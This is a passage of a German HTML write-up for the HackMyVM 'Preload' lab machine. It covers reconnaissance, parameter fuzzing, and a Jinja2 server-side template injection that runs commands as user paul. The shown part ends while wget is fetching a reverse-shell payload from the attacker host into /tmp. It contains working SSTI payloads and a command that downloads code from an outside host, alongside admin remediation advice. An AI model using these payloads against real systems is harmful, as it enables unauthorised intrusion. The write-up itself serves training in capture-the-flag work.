@@ -1,0 +1,865 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Preload - HackMyVM - Easy - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Die CSS-Datei 'style.css' muss die Farben für 'Easy' (Grün/Lime) enthalten -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Preload - HackMyVM - Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Farbe 'lime' durch CSS -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <!-- Segmentfarben 'lime' durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Hintergrundfarbe durch CSS -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">telnet</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">wfuzz</div>
+                <div class="tool-item">python3 (http.server, pty)</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">php (remote)</div>
+                <div class="tool-item">stty</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">nano (oder vi)</div>
+                <div class="tool-item">gcc</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">cut (via sudo)</div>
+                <div class="tool-item">grep (via sudo)</div>
+                <div class="tool-item">tail (via sudo)</div>
+                <div class="tool-item">head (via sudo)</div>
+                <div class="tool-item">ss (via sudo)</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">mkdir</div>
+                <div class="tool-item">wget</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access (SSTI)</a></li>
+                <li><a href="#privilege-escalation-poc">Privilege Escalation (LD_PRELOAD - POC)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Wie üblich beginnen wir mit `arp-scan`, um aktive Hosts im lokalen Netzwerk zu entdecken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.129	08:00:27:9b:f0:00	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.129 wurde identifiziert. Die MAC-Adresse deutet wieder auf eine VirtualBox-VM hin. Dies ist unser Ziel für die weiteren Scans.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie einen Port-Scan auf 192.168.2.129 durch. Da spätere Befehle den Hostnamen `preload.hmv` verwenden, fügen Sie einen entsprechenden Eintrag zur lokalen `/etc/hosts`-Datei hinzu (`192.168.2.129 preload.hmv`), um die Namensauflösung zu gewährleisten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerküberwachung kann helfen, Scans zu erkennen. Die Verwendung von Hostnamen statt IPs durch Angreifer deutet manchmal auf Informationen aus DNS oder Konfigurationsdateien hin. Stellen Sie sicher, dass interne Hostnamen nicht unnötig exponiert werden.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein `nmap`-Scan wird auf den Hostnamen `preload.hmv` (nach Eintrag in `/etc/hosts`) durchgeführt. Optionen: `-sS` (SYN-Scan), `-sC` (Standard-Skripte), `-T5` (schnelles Timing), `-A` (Aggressive Optionen, inkl. OS-Detektion), `-O` (alternative OS-Detektion, oft redundant mit `-A`), `-p-` (alle Ports).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -AO preload.hmv -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-20 23:41 CEST
+Nmap scan report for preload.hmv (192.168.2.129)
+Host is up (0.00012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 4f4c82942b99f8ea67ff673c068a71b5 (RSA)
+|   256 c42c9bc812932f8af1571cf6ab88b961 (ECDSA)
+|_  256 10187b11c4c3d41a54cc186814bb2ea7 (ED25519)
+80/tcp   open  http       nginx 1.18.0
+|_http-title: Welcome to nginx!
+|_http-server-header: nginx/1.18.0
+5000/tcp open  landesk-rc LANDesk remote management
+MAC Address: 08:00:27:9B:F0:00 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms preload.hmv (192.168.2.129)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.88 seconds
+                    </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Drei offene Ports wurden gefunden:
+                *   **Port 22 (SSH):** Standard OpenSSH 8.4p1 auf Debian.
+                *   **Port 80 (HTTP):** nginx 1.18.0 mit einer Standard-Willkommensseite.
+                *   **Port 5000 (landesk-rc?):** Nmap identifiziert diesen Port als "LANDesk remote management", was ungewöhnlich für eine Linux-VM ist. Dies erfordert weitere Untersuchung.
+                Das Betriebssystem wird als Linux (Debian) identifiziert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie Port 80 mit Web-Enumeration-Tools (z.B. `gobuster`, `nikto`). **Priorität:** Untersuchen Sie den Dienst auf Port 5000 genauer, da die Identifizierung durch nmap unsicher sein könnte. Versuchen Sie eine Verbindung mit `telnet` oder `nc`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen sind. Wenn Port 5000 nicht benötigt wird, schließen Sie ihn in der Firewall. Aktualisieren Sie nginx und OpenSSH. Überprüfen Sie, welcher Dienst tatsächlich auf Port 5000 läuft.
+            </p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver (Port 80) zu finden. Es wird eine umfangreiche Liste von Erweiterungen (`-x`) und eine Standard-Wortliste verwendet. `-b '403,404'` blendet nicht gefundene/verbotene Seiten aus, `-e` erweitert die Suche auf Dateien und Verzeichnisse, `--no-error` unterdrückt Verbindungsfehler in der Ausgabe.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://preload.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://preload.hmv
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.5
+[+] Extensions:              txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,kdbx
+[+] Expanded:                true
+[+] Timeout:                 10s
+[+] Suppress error output:   true
+===============================================================
+2023/04/20 23:44:10 Starting gobuster
+===============================================================
+http://preload.hmv/index.html           (Status: 200) [Size: 612]
+===============================================================
+2023/04/20 23:45:25 Finished
+===============================================================
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan auf Port 80 war nicht sehr ergiebig. Nur die Standard-Datei `index.html` (die zur "Welcome to nginx!"-Seite gehört) wurde gefunden. Dies deutet darauf hin, dass der Webserver auf Port 80 keine benutzerdefinierte Anwendung hostet oder dass relevante Dateien/Verzeichnisse nicht in der Wortliste enthalten waren. Der Fokus sollte sich nun auf Port 5000 richten.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwenden Sie `nikto` für einen schnellen Check auf bekannte Webserver-Schwachstellen auf Port 80, aber konzentrieren Sie die manuelle Untersuchung auf Port 5000.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Wenn Port 80 nur die Standardseite anzeigt, prüfen Sie, ob der nginx-Dienst überhaupt benötigt wird.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird auf Port 80 ausgeführt, um nach bekannten Schwachstellen, Konfigurationsfehlern und interessanten Dateien zu suchen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h preload.hmv</span></div>
+                     <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.129
++ Target Hostname:    preload.hmv
++ Target Port:        80
++ Start Time:         2023-04-20 23:45:40 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
++ 7962 requests: 0 error(s) and 3 item(s) reported on remote host
++ End Time:           2023-04-20 23:45:52 (GMT2) (12 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto meldet fehlende Sicherheitsheader (`X-Frame-Options`, `X-Content-Type-Options`), was Best Practice-Verstöße sind, aber selten direkt ausnutzbar. Interessanter ist der Fund `/#wp-config.php#`. Dies ist höchstwahrscheinlich ein **False Positive**, da es sich um einen nginx-Server ohne Anzeichen von WordPress handelt. Nikto versucht oft, nach bekannten Dateien von CMS-Systemen zu suchen. Dieser Fund ist wahrscheinlich nicht relevant.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ignorieren Sie den `#wp-config.php#`-Fund vorerst. Konzentrieren Sie sich auf Port 5000.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie die fehlenden Sicherheitsheader (`X-Frame-Options: DENY` oder `SAMEORIGIN`, `X-Content-Type-Options: nosniff`) in der nginx-Konfiguration, um die allgemeine Sicherheit zu erhöhen und Browser vor bestimmten Angriffen (Clickjacking, MIME-Sniffing) zu schützen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird versucht, mit `telnet` eine Verbindung zum Port 5000 herzustellen, um den dort laufenden Dienst manuell zu untersuchen und zu identifizieren.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.129 5000</span></div>
+                     <pre>
+Trying 192.168.2.129...
+Connected to 192.168.2.129.
+Escape character is '^]'.
+ * Serving Flask app 'code' (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+Traceback (most recent call last):
+  File "/home/paul/code.py", line 18, in <module>
+    app.run(host="0.0.0.0", port=50000)
+  File "/usr/local/lib/python3.9/dist-packages/flask/app.py", line 920, in run
+    run_simple(t.cast(str, host), port, self, **options)
+  File "/usr/local/lib/python3.9/dist-packages/werkzeug/serving.py", line 1010, in run_simple
+    inner()
+  File "/usr/local/lib/python3.9/dist-packages/werkzeug/serving.py", line 950, in inner
+    srv = make_server(
+  File "/usr/local/lib/python3.9/dist-packages/werkzeug/serving.py", line 782, in make_server
+    return ThreadedWSGIServer(
+  File "/usr/local/lib/python3.9/dist-packages/werkzeug/serving.py", line 688, in __init__
+    super().__init__(server_address, handler)  # type: ignore
+  File "/usr/lib/python3.9/socketserver.py", line 452, in __init__
+    self.server_bind()
+  File "/usr/lib/python3.9/http/server.py", line 138, in server_bind
+    socketserver.TCPServer.server_bind(self)
+  File "/usr/lib/python3.9/socketserver.py", line 466, in server_bind
+    self.socket.bind(self.server_address)
+OSError: [Errno 98] Address already in use
+Connection closed by foreign host.
+                    </pre>
+                </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Sehr aufschlussreich! Die Verbindung zu Port 5000 liefert einen Python-Traceback.
+                *   Es läuft eine **Flask-Webanwendung** (nicht LANDesk).
+                *   Die Anwendung wird durch das Skript `/home/paul/code.py` gestartet. Dies verrät den **Benutzernamen `paul`**.
+                *   Die Anwendung versucht, auf Port **50000** zu lauschen (`app.run(..., port=50000)`).
+                *   Es gibt einen Fehler `OSError: [Errno 98] Address already in use`. Das bedeutet, dass der Port 50000 bereits von einem anderen Prozess belegt ist (oder die Anwendung versucht hat, sich zweimal an denselben Port zu binden). Der Prozess auf Port 5000 ist vermutlich nur ein Wrapper oder eine abgestürzte Instanz. Die eigentliche Web-App sollte auf Port 50000 laufen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ignorieren Sie Port 5000 für weitere Web-Interaktionen. Konzentrieren Sie sich auf **Port 50000**. Versuchen Sie, diesen Port mit `curl` oder einem Browser aufzurufen. Führen Sie Web-Enumeration (Parameter-Fuzzing, Verzeichnissuche) auf Port 50000 durch. Notieren Sie den Benutzernamen `paul`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Untersuchen Sie, warum die Anwendung auf Port 5000 einen Fehler wirft und warum sie versucht, auf Port 50000 zu laufen. Beheben Sie den Port-Konflikt (`Address already in use`). Führen Sie Flask-Anwendungen niemals im Development-Modus (`WARNING: This is a development server.`) in einer Produktionsumgebung aus; verwenden Sie einen robusten WSGI-Server wie Gunicorn oder uWSGI. Schützen Sie Tracebacks davor, an den Client gesendet zu werden, da sie sensible Informationen preisgeben (Pfade, Benutzernamen, Code-Struktur).
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf den Erkenntnissen aus dem Telnet-Traceback wird versucht, mit `curl` auf Port 50000 zuzugreifen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.129:50000</span></div>
+                    <pre>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+<title>500 Internal Server Error</title>
+<h1>Internal Server Error</h1>
+<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Server auf Port 50000 antwortet, liefert aber einen `500 Internal Server Error`. Dies bestätigt, dass dort ein Webdienst läuft, aber er funktioniert nicht korrekt ohne weitere Parameter oder leidet unter einem Fehler (möglicherweise im Zusammenhang mit dem zuvor gesehenen Port-Konflikt oder einem anderen Anwendungsproblem). Das Ziel ist es nun, herauszufinden, wie man mit der Anwendung interagieren kann.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führen Sie Parameter-Fuzzing auf Port 50000 durch, um gültige GET/POST-Parameter zu finden, die die Anwendung erwartet. Tools wie `wfuzz` oder `ffuf` sind hierfür geeignet.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Analysieren Sie die Server-Logs für Port 50000, um die Ursache des "Internal Server Error" zu finden und zu beheben. Stellen Sie sicher, dass die Anwendung robust auf fehlende oder ungültige Eingaben reagiert, anstatt mit einem generischen Fehler 500 abzustürzen.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `wfuzz` wird eingesetzt, um GET-Parameter für die URL `http://192.168.2.129:50000/` zu finden.
+                `-c`: Farbige Ausgabe.
+                `-w ...`: Wortliste für die Parameter-Namen (`directory-list-2.3-medium.txt` wird hier zweckentfremdet, eine spezifische Parameterliste wäre besser).
+                `-u 'http://.../?FUZZ=id'`: Die URL, wobei `FUZZ` durch die Einträge aus der Wortliste ersetzt wird. `=id` ist ein beliebiger Wert, um zu sehen, ob der Parameter akzeptiert wird.
+                `--hh 290`: Versteckt Antworten mit genau 290 Zeichen (Hide Header). Dies ist vermutlich die Größe der "Internal Server Error"-Seite, um nur erfolgreiche oder abweichende Antworten anzuzeigen.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u 'http://192.168.2.129:50000/?FUZZ=id' --hh 290</span></div>
+                    <pre>
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://192.168.2.129:50000/?FUZZ=id
+Total requests: 220543
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000005340:   200        0 L      1 W        2 Ch        "cmd"
+
+Total time: 11.28659s
+Processed Requests: 220543
+Filtered Requests: 220542
+Requests/sec.: 19540.02
+                    </pre> <!-- Ausgabe leicht gekürzt -->
+                 </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Erfolg! `wfuzz` hat einen gültigen GET-Parameter gefunden: `cmd`. Die Antwort für `/?cmd=id` hatte nur 2 Zeichen, was sich signifikant von der 290 Zeichen langen Fehlerseite unterscheidet. Dies deutet stark darauf hin, dass der `cmd`-Parameter zur Befehlsausführung verwendet wird.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Testen Sie den `cmd`-Parameter manuell mit `curl`. Versuchen Sie, einfache Befehle wie `id`, `ls`, `whoami` auszuführen. Untersuchen Sie, ob eine Schwachstelle wie Command Injection oder Server-Side Template Injection (SSTI) vorliegt.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Dringend:** Untersuchen Sie den Code von `/home/paul/code.py` auf die Verarbeitung des `cmd`-Parameters. Wenn dieser Parameter zur unsicheren Befehlsausführung verwendet wird, beheben Sie die Schwachstelle sofort (z.B. durch Validierung der Eingabe, Verwendung sicherer APIs, Entfernen der Funktionalität).
+            </p>
+
+        </section>
+
+        <section id="initial-access">
+             <h2>Initial Access (SSTI)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Erneuter `telnet`-Versuch auf Port 5000. Dies liefert keine neuen technischen Informationen, zeigt aber, dass der Pentester die Ausgabe beobachtet, während er möglicherweise Anfragen an Port 50000 sendet. Die Notiz "Python Vulnerability gefunden in flask, per telnet" fasst die bisherige Erkenntnis zusammen, dass eine Flask-Anwendung involviert ist.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.129 5000</span></div>
+                     <pre>
+Trying 192.168.2.129...
+Connected to 192.168.2.129.
+Escape character is '^]'.
+ * Serving Flask app 'code' (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+
+
+ Python Vulnerability gefunden in flask, per telnet
+                     </pre> <!-- Verbindung bricht evtl. ab oder bleibt offen -->
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Dient der Bestätigung und Kontextualisierung, bevor der eigentliche Exploit-Versuch mit `curl` gestartet wird.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie den gefundenen `cmd`-Parameter, um die Schwachstelle auszunutzen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlungen zur Absicherung der Flask-Anwendung.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Dies ist der entscheidende Schritt zur Ausnutzung. `curl` wird verwendet, um eine Anfrage an Port 50000 mit dem `cmd`-Parameter zu senden. Der Wert des Parameters ist `{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`. Dies ist eine typische **Server-Side Template Injection (SSTI)** Payload für Flask/Jinja2-Templates. Sie navigiert durch Python-Objekte (`request`, `application`, `globals`, `builtins`), importiert das `os`-Modul und führt den Befehl `id` mittels `popen().read()` aus. Das Ergebnis wird in die Template-Antwort eingefügt. Die geschweiften Klammern `{{` und `}}` sind die Syntax für Template-Ausdrücke in Jinja2.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.129:50000/?cmd=\{\{request.application.__globals__.__builtins__.__import__(%27os%27).popen('id').read()\}\}"</span></div>
+                     <pre>
+uid=1000(paul) gid=1000(paul) groups=1000(paul)
+                     </pre>
+                </div>
+            </div>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Initial Access erfolgreich!** Die SSTI-Schwachstelle wurde bestätigt und ausgenutzt. Der `id`-Befehl wurde auf dem Server ausgeführt und seine Ausgabe (`uid=1000(paul)...`) wurde in der HTTP-Antwort zurückgegeben. Der Code wird im Kontext des Benutzers `paul` ausgeführt.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutzen Sie die SSTI, um weitere Befehle auszuführen. Ziel ist es, eine stabilere Reverse Shell zu erhalten. Listen Sie Dateien auf (`ls`), lesen Sie sensible Dateien (`cat`), und bereiten Sie den Download und die Ausführung einer Reverse Shell vor.
+                <br>
+                <strong>Empfehlung (Admin):** **Dringend:** Beheben Sie die SSTI-Schwachstelle in `/home/paul/code.py`. Dies erfordert in der Regel, Benutzereingaben niemals direkt oder indirekt in Template-Strings zu verwenden oder unsichere Template-Funktionen zu deaktivieren/sanitisieren. Aktualisieren Sie Flask und Jinja2. Führen Sie Code-Reviews durch, um ähnliche Schwachstellen zu finden.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine weitere Telnet-Verbindung zu Port 5000 wird geöffnet, um die Server-Logs der Flask-Anwendung zu beobachten, während der SSTI-Exploit auf Port 50000 ausgeführt wird. Die Log-Ausgabe bestätigt den Empfang der GET-Anfrage mit der SSTI-Payload und den erfolgreichen Statuscode 200.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">telnet 192.168.2.129 5000</span></div>
+                     <pre>
+Trying 192.168.2.129...
+Connected to 192.168.2.129.
+Escape character is '^]'.
+ * Serving Flask app 'code' (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+ * Running on all addresses.
+   WARNING: This is a development server. Do not use it in a production deployment.
+ * Running on http://192.168.2.129:50000/ (Press CTRL+C to quit)
+
+192.168.2.130 - - [20/Apr/2023 18:16:44] "GET /?cmd={{request.application.__globals__.__builtins__.__import__(%27os%27).popen('id').read()}} HTTP/1.1" 200 -
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Log-Ausgabe bestätigt die erfolgreiche Verarbeitung der Anfrage mit der SSTI-Payload auf Port 50000.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fahren Sie mit der Ausführung weiterer Befehle über die SSTI fort.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie ausführliche Debug-Logs in Produktionsumgebungen, da sie Angreifern bei der Analyse helfen können. Beheben Sie die SSTI-Schwachstelle.
+            </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die SSTI wird genutzt, um den Inhalt des Home-Verzeichnisses von `paul` aufzulisten (`ls /home/paul`). Der Befehl wird URL-kodiert (`%20` für Leerzeichen).
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.129:50000/?cmd=\{\{request.application.__globals__.__builtins__.__import__(%27os%27).popen('ls%20/home/paul').read()\}\}"</span></div>
+                     <pre>
+code.py
+us3r.txt
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Die Dateien `code.py` (das Flask-Anwendungsskript) und `us3r.txt` (wahrscheinlich die User-Flag) wurden gefunden.
+            </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lesen Sie den Inhalt von `us3r.txt` mittels SSTI (`cat%20/home/paul/us3r.txt`). Es ist jedoch üblich, die User-Flag erst nach einer stabilen Shell zu lesen. Bereiten Sie nun den Download und die Ausführung einer Reverse Shell vor.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Sichern Sie Benutzerverzeichnisse ab. Flags sind in realen Systemen nicht vorhanden, aber sensible Dateien sollten geschützt werden.
+            </p>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Versuch, mittels SSTI ein `.ssh`-Verzeichnis im Home-Verzeichnis von `paul` zu erstellen. Dies ist oft ein Vorbereitungsschritt, um später einen SSH Public Key hochzuladen und sich per SSH anzumelden. Die Ausgabe "Welcome!!!!!!!!!!!!!" ist die Standard-Antwort der Flask-App, wenn der ausgeführte Befehl (wie `mkdir`) keine Standardausgabe erzeugt.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.129:50000/?cmd=\{\{request.application.__globals__.__builtins__.__import__(%27os%27).popen('mkdir%20/home/paul/.ssh').read()\}\}"</span></div>
+                     <pre>
+Welcome!!!!!!!!!!!!!
+                     </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Der Befehl wurde wahrscheinlich erfolgreich ausgeführt (keine Fehlermeldung). Dies bestätigt weitere Kontrolle über das System mittels SSTI.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dieser Pfad (SSH-Key-Upload) wird hier anscheinend nicht weiterverfolgt. Konzentrieren Sie sich auf die Reverse Shell.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überwachung von Dateisystemänderungen kann verdächtige Aktivitäten aufdecken.
+            </p>
+
+             <!-- Weitere ls-Befehle zur Bestätigung, können zusammengefasst werden -->
+             <p class="analysis">
+                <strong>Analyse:</strong> Weitere `ls`-Befehle werden über SSTI ausgeführt, um die Existenz des Benutzers `paul` und den Inhalt seines Home-Verzeichnisses zu bestätigen. Die Ergebnisse sind konsistent mit den vorherigen Funden.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.129:50000/?cmd=\{\{request.application.__globals__.__builtins__.__import__(%27os%27).popen('ls%20/home/paul').read()\}\}"</span></div>
+                     <pre>
+code.py
+us3r.txt
+                     </pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.129:50000/?cmd=\{\{request.application.__globals__.__builtins__.__import__(%27os%27).popen('ls%20/home/').read()\}\}"</span></div>
+                     <pre>
+paul
+                     </pre>
+                 </div>
+             </div>
+             <p class="evaluation">
+                <strong>Bewertung:</strong> Bestätigt die bisherigen Erkenntnisse.
+             </p>
+             <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fahren Sie mit dem Reverse-Shell-Setup fort.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Keine neuen Empfehlungen.
+             </p>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die SSTI-Schwachstelle wird genutzt, um mittels `wget` eine Datei (`r`) vom Angreifer-System (192.168.2.130:9000) herunterzuladen und auf dem Zielsystem als `/tmp/reverse.php` zu speichern. Dies ist der Reverse-Shell-Payload. Die Ausgabe "Welcome!!!!!!!!!!!!!" zeigt an, dass `wget` keine Standardausgabe erzeugt hat (oder diese unterdrückt wurde).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl 'http://192.168.2.129:50000/?cmd=\{\{request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27wget%20http://192.168.2.130:9000/r%20-O%20/tmp/reverse.php%27).read()\}\}'</span></div>
+                    <pre>
+Welcome!!!!!!!!!!!!!
+                    </pre>
+                 </div>
+            </div>
+             <p class="evaluation">
